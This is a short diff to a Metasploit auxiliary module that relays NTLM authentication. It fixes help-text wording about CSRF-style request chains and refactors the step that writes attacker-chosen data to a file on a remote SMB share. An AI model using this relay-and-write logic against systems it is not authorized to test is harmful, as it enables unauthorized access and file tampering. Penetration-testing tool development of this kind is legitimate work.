@@ -41,7 +41,7 @@ class Metasploit3 < Msf::Auxiliary
 					protocols (currently it supports relaying to SMB and HTTP).
 
 					Complicated custom attacks requiring multiple requests that depend on each
-					other can be written using the SYNC* options. For example, to performing a
+					other can be written using the SYNC* options. For example, a typical CSRF
 					typical CSRF style attack might look like:
 
 					1)	Set an HTTP_GET request with a unique SNYNCID
@@ -413,10 +413,12 @@ class Metasploit3 < Msf::Auxiliary
 		share, path = datastore['RURIPATH'].split('\\', 2)
 		path = path
 		ser_sock.client.tree_connect(share)
-		ser_sock.client.open('\\' << path)
-		ser_sock.client.write(ser_sock.client.last_file_id, 0, data=datastore['FINALPUTDATA'])
+
+		fd = ser_sock.open("\\#{path}", 'rwct')
+		fd << datastore['FINALPUTDATA']
+		fd.close
+
 		logdata = "File \\\\#{datastore['RHOST']}\\#{datastore['RURIPATH']} written"
-		ser_sock.client.close()
 		print_status(logdata)
 		return logdata
 	end
